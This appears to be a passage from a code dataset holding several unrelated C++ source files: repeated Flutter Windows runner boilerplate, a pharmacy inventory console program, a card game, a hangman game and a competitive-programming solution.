|EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include<iostream>\r\n#include<vector>\r\n#include<fstream>\r\nusing namespace std;\r\nstruct pharmacy{\r\n\tchar id;\r\n\tstring name;\r\n\tint quantity;\r\n\tint price;\r\n};\r\n    pharmacy phar;\r\n    vector<pharmacy> medics;\r\n   \r\n    addval(){\r\n    \tint choice;\r\n    \tdo{\r\n    \t\tcout<<\"Id: \";cin>>phar.id;\r\n    \t\tcout<<\"Name: \";cin>>phar.name;\r\n    \t\tcout<<\"quantity: \";cin>>phar.quantity;\r\n    \t\tcout<<\"price: \";cin>>phar.price;\r\n    \t\tmedics.push_back(phar);\r\n    \t\tcout<<\"save successfuly\"<<endl;\r\n    \t\tcout<<\"enter '0' for exit or '1' for continue: \";cin>>choice;\r\n\t\t}\r\n\t\twhile(choice!=0 && choice ==1);\r\n\t}\r\n\t\r\n\tsearch(){\r\n\t\tstring n;\r\n\t\tcout<<\"Enter name for search: \";cin>>n;\r\n\t\tfor(int i=0;i<medics.size();i++){\r\n\t\t\tif(n==medics[i].name){\r\n\t\t\t\tcout<<i+1<<\". Id:\"<<medics[i].id<<endl;\r\n\t\t\t\tcout<<i+1<<\". name:\"<<medics[i].name<<endl;\r\n\t\t\t\tcout<<i+1<<\". quantity:\"<<medics[i].quantity<<endl;\r\n\t\t\t\tcout<<i+1<<\". price:\"<<medics[i].price<<endl<<endl;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\t\r\n\tdel (){\r\n\t\tstring n;\r\n\t\tcout<<\"Enter name for search: \";cin>>n;\r\n\t\tfor(int i=0;i<medics.size();i++){\r\n\t\t\tif(n==medics[i].name){\r\n\t\t\t\tmedics.erase(medics.begin()+i);\r\n\t\t\t\tcout<<\"deleted \"<<medics[i].name<<endl<<endl;\r\n\t\t\t}\r\n\t}\r\n}\r\n\tshow(){\r\n\t\tfor(int i=0;i<medics.size(); i++){\r\n\t\tcout<<i+1<<\". Id:\"<<medics[i].id<<endl;\r\n\t\t\t\tcout<<\" name:\"<<medics[i].name<<endl;\r\n\t\t\t\tcout<<\" quantity:\"<<medics[i].quantity<<endl;\r\n\t\t\t\tcout<<\" price:\"<<medics[i].price<<endl<<endl;\t\r\n\t\t}\r\n\t}\r\n\t\r\n\t\tsave(const vector<pharmacy>&medics, const string& medical){\r\n\t\tofstream out(\"D:/medical.txt\");\r\n\t\tif(!out){\r\n\t\t\tcerr<<\"file not found: \"<<medical<<endl;\r\n\t\t}\r\n\t\tfor(int i=0;i<medics.size(); i++){\r\n\t\t\tout<<i+1<<\"Id: \"<<medics[i].id<<endl<<\" name:\"<<medics[i].name<<endl\r\n\t\t\t<<\"quantity: \"<<medics[i].quantity<<endl<<\"price: \"<<medics[i].price<<endl;\r\n\t\t}\r\n\t\tout.close();\r\n\t\tcout<<\"medicines saved to file \"<<medical<<endl<<endl;\r\n\t\t}\r\n\t\r\n\t\r\n    int main(){\r\n    \twhile(true){\r\n    \t\tint value;\r\n    \t\tcout<<\"\\t\\t===================\\n\\n\";\r\n\t\t    cout<<\"\\t\\t-------------------\\n\";\r\n\t\t        cout<<\"1.for add medicines: \"<<endl;\r\n    \t     \tcout<<\"2.for search medicines: \"<<endl;\r\n    \t\t    cout<<\"3.for delete medicines: \"<<endl;\r\n    \t\t    cout<<\"4.for show all medicines: \"<<endl;\r\n    \t\t    cout<<\"5.for save medicines to file: \"<<endl;\r\n    \t    \tcout<<\"6.for exit from program: \"<<endl;\r\n    \t    \tcout<<\"\\t\\t---------------------\\n\";\r\n    \t\tcout<<\"type here:\";cin>>value;\r\n    \t\tswitch(value){ system(\"cls\");\r\n    \t\t\tcase 1:{\r\n\t\t\t\t\taddval();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\tcase 2:{        system(\"cls\");\r\n\t\t\t\t\tsearch();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\tcase 3:{        system(\"cls\");\r\n\t\t\t\t\tdel();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\tcase 4:{        system(\"cls\");\r\n\t\t\t\t\tshow();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\tcase 5:{\r\n\t\t\t\t\tsave(medics, \"D:/medical.txt\" );\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\tcase 6:{\r\n\t\t\t\t\texit(0);\r\n\t\t\t\t\t\r\n\t\t\t\t\r\n\t\t\t}\r\n\t\t\tdefault:\r\n\t\t\t\t{system(\"cls\"); cout<<\"invalid input \"<<endl<<endl;}\r\n\t\t}\r\n\t}\r\n\t\r\n}\r\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <stdlib.h>\r\n#include <time.h>\r\n#include <iomanip>\r\n#include <conio.h>\r\n\r\nusing namespace std;\r\n\r\n\r\nstruct kart{\r\n    string type;\r\n    int point;\r\n};\r\n\r\nstruct player{\r\n    string name;\r\n    int point = 0;\r\n    vector<kart> kart_mojod;\r\n    vector<kart> kart_nemayesh_mordegan;\r\n};\r\n\r\n\r\nvector<kart> karts;\r\n\r\nint max_point;\r\nint player_number;\r\n\r\nvoid control_unit(player *);\r\nvoid meghdardehi_player(vector<kart> *);\r\nvoid play_game(player *);\r\nvoid what_max_point();\r\nvoid signin_player(player *);\r\nvoid start();\r\nvoid amaliat(player * , int  , bool &);\r\nvoid show_kartsgame(player * , int  , bool & );\r\nbool shart_emtiaz(player );\r\nvoid shomaresh_emtiaz(player *);\r\nbool shart_edame(player *);\r\nvoid tozie_kart(player *);\r\nint win_player_f(player *);\r\nvoid show_table(player *);\r\nvoid sort_players(player *);\r\nvoid end_game(player *);\r\nvoid show_curentkarts(vector<kart> );\r\n\r\nvoid meghdardehi_kartha(){\r\n    srand(time(0));\r\n    kart kohnepich[30];\r\n    kart kalekado[30];\r\n    kart gorbegor[30];\r\n\r\n    for(int i=0 ; i<30 ; i++){\r\n        \r\n        kohnepich[i].type = \"kohne pich\";\r\n        kohnepich[i].point = (rand() % 15) + 1;\r\n        kalekado[i].type = \"kale kadoo\";\r\n        kalekado[i].point = (rand() % 15) + 1;\r\n        gorbegor[i].type = \"gor be gor\";\r\n        gorbegor[i].point = (rand() % 15) + 1;\r\n    }\r\n\r\n    for(int i=0 ; i<30 ; i++)\r\n    {\r\n        karts.push_back(kohnepich[i]);\r\n        karts.push_back(kalekado[i]);\r\n        karts.push_back(gorbegor[i]);\r\n    }\r\n}\r\n\r\nint main()\r\n{   \r\n    system(\"cls\");\r\n    cout << \"\\n\\n\\n\\n be bazi kastel khoshomadid.\\n\";\r\n    cout << \"\\n\\n\\n\\t main menu\\n\";\r\n    cout << \"\\n 1-shoroe bazi jadid\\n 2-exit\\n\\nentekhab: \";\r\n    int ch;\r\n    cin >> ch;\r\n\r\n    switch (ch)\r\n    {\r\n    case 1: start();break;\r\n    case 2: return 0; break;\r\n    default:\r\n        cout << \"entekhab eshtebah ast.\";\r\n        getch();\r\n        main();\r\n    }\r\n}\r\n\r\nvoid what_max_point()\r\n{\r\n    cout << \"hadaxar emtiaz bazi chand bashad? \";\r\n    cin >> max_point;\r\n}\r\n\r\nvoid signin_player(player *p)\r\n{\r\n\r\n    for(int i=0 ; i<player_number ; i++){\r\n        cout << \"name bazikon shomare \" << i+1 << \" ra vared konid: \";\r\n        cin >> p[i].name ;\r\n    }\r\n}\r\n\r\nvoid meghdardehi_player(vector<kart> *k){\r\n    srand(time(0));\r\n    int count = (rand() % (karts.size()-1));\r\n    while(k->size() < 3){\r\n        k->push_back(karts[count]);\r\n        karts.erase(karts.begin()+count);\r\n    }\r\n}\r\n\r\nvoid amaliat(player *p , int i , bool &b)\r\n{\r\n    cout << \"shomare kart mored nazar az dast khod ra entekhab konid: \";\r\n    int choosen;\r\n    cin >> choosen;\r\n\r\n    cout << \"shomare daste kart mored nazar barai entaghal kart entekhab shode ra entekhab konid: \";\r\n    int row_choosen;\r\n    cin >> row_choosen;\r\n\r\n    cout << \"shomare kart mored nazar dar dastekart entekhab shode barai entaghal kart ra entekhab konid: \";\r\n    int kart_gharargiri;\r\n    cin >> kart_gharargiri;\r\n\r\n    if(!(choosen >= 1 && choosen <= 3) || !(row_choosen >= 1 && row_choosen <= player_number) || !(kart_gharargiri >= 1 && kart_gharargiri <= 6))\r\n    {\r\n        cout << \"adad vorodi eshtebah ast.\";\r\n        getch();\r\n        show_kartsgame(p , i , b);\r\n    }\r\n    else if(p[row_choosen-1].kart_nemayesh_mordegan.size() < kart_gharargiri){\r\n        p[row_choosen-1].kart_nemayesh_mordegan.push_back(p[i].kart_mojod[choosen-1]);\r\n        p[i].kart_mojod.erase(p[i].kart_mojod.begin() + choosen-1);\r\n    }\r\n    else if(p[row_choosen-1].kart_nemayesh_mordegan[kart_gharargiri-1].type == p[i].kart_mojod[choosen-1].type){\r\n        \r\n        bool u = 1;\r\n        for(auto &j : p[row_choosen-1].kart_nemayesh_mordegan){\r\n            \r\n            if(j.type == p[i].kart_mojod[choosen-1].type && j.point == p[i].kart_mojod[choosen-1].point){\r\n                j = p[i].kart_mojod[choosen-1];\r\n                u = 0;\r\n            }\r\n        }\r\n        if(u)\r\n            p[row_choosen-1].kart_nemayesh_mordegan[kart_gharargiri-1] =  p[i].kart_mojod[choosen-1];\r\n        \r\n        p[i].kart_mojod.erase(p[i].kart_mojod.begin() + choosen-1);\r\n    }\r\n    \r\n    else{\r\n        cout << \"kart ha ba ham, ham type nistand. bayad kart hai entekhab shode ham type va ham noe bashand.\\n\";\r\n        getch();\r\n        show_kartsgame(p , i , b);\r\n    }\r\n    \r\n    if(p[row_choosen-1].kart_nemayesh_mordegan.size() == 6 || p[i].kart_mojod.size() == 0) b = 1;\r\n}\r\n\r\nvoid show_curentkarts(vector<kart> curentkart){\r\n    cout << \"\\t\\t\\t  +\\t\\t\\t\";\r\n    for(int k=0 ; k<3 ; k++){\r\n        cout << setfill('-') << setw(16) << \"  \";\r\n    }\r\n    cout << setfill(' ') << setw(29) <<'+' << endl;\r\n    for(int l=0 ; l<7 ; l++){\r\n        if(l == 2){\r\n            cout << \"\\t\\t\\t  +\\t\\t\\t\";\r\n            for(int k=0 ; k<curentkart.size() ; k++){\r\n                cout << \"| \" << curentkart[k].type << \" |  \";\r\n            }\r\n            \r\n            cout << setfill(' ') << setw(29) <<'+' << endl;\r\n        }\r\n        else if(l == 4){\r\n            cout << \"\\t\\t\\t  +\\t\\t\\t\";\r\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include <stdlib.h>\nusing namespace std;\n\nint main(){\n    \n    char palavra[30], letra[1], secreta[30];\n    int tam, i, chances, acertos;\n    bool acerto;\n    \n    chances = 6;\n    tam = 0;\n    i = 0;\n    acerto = false;\n    acertos = 0;\n    \n    cout << \"Digite a palavra secreta: \\n\";\n    cin >> palavra;\n    system (\"clear\");\n    \n    while (palavra[i] != '\\0'){\n        i++;\n        tam++;\n    }\n    \n    for(i=0; i<tam; i++){\n        secreta[i] = '-';\n    }\n    \n    while ((chances > 0) && (acertos < tam)){\n        cout << \"Chances restantes: \" << chances << \"\\n\\n\";\n        cout << \"Palvra secreta: \";\n        for(i=0; i<tam; i++){\n            cout << secreta[i];\n        }\n        cout << \"\\n\\nDigite uma letra: \";\n        cin >> letra[0];\n        for(i=0; i<tam; i++){\n            if (palavra[i] == letra[0]){\n                acerto = true;\n                secreta[i] = palavra[i];\n                acertos++;\n            }\n        }\n        if (!acerto){\n            chances--;\n        }\n        acerto = false;\n        system(\"clear\");\n    }\n    if (acertos==tam){\n        cout << \"Voce venceu\";\n        \n    }else{\n        cout << \"perdeu, burro!\"; \n    }\n    return 0;\n    \n}",
    "class Solution {\npublic:\n    vector<long long> maximumSegmentSum(vector<int>& nums, vector<int>& removeQueries) {\n        int n = nums.size();\n        multiset<long long> s;\n        s.insert(0);\n        set<pair<int, int>> in;\n        vector<long long> pre(n, nums[0]);\n        for(int i = 1; i < n; i++) pre[i] = pre[i - 1] + nums[i];\n        \n        in.insert({0, n - 1});\n        \n        s.insert(pre[n - 1]);\n        \n        vector<long long> ans;\n        for(auto p : removeQueries) {\n            auto it = in.upper_bound({p, 2e9});\n            it--;\n            \n            long long L = (p ? pre[p - 1] : 0) - (it -> first ? pre[it -> first - 1] : 0);\n            long long R = pre[it -> second] - pre[p];\n            long long T = pre[it -> second] - (it -> first ? pre[it -> first - 1] : 0);\n            \n            s.erase(s.find(T));\n            if(it -> first <= p - 1) {\n                in.insert({it -> first, p - 1});\n                s.insert(L);\n            }\n            if(it -> second >= p + 1) {\n                in.insert({p + 1, it -> second});\n                s.insert(R);\n            }\n            \n            in.erase(it);\n            ans.push_back(*s.rbegin());\n        }\n        return ans;\n    }\n};\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class 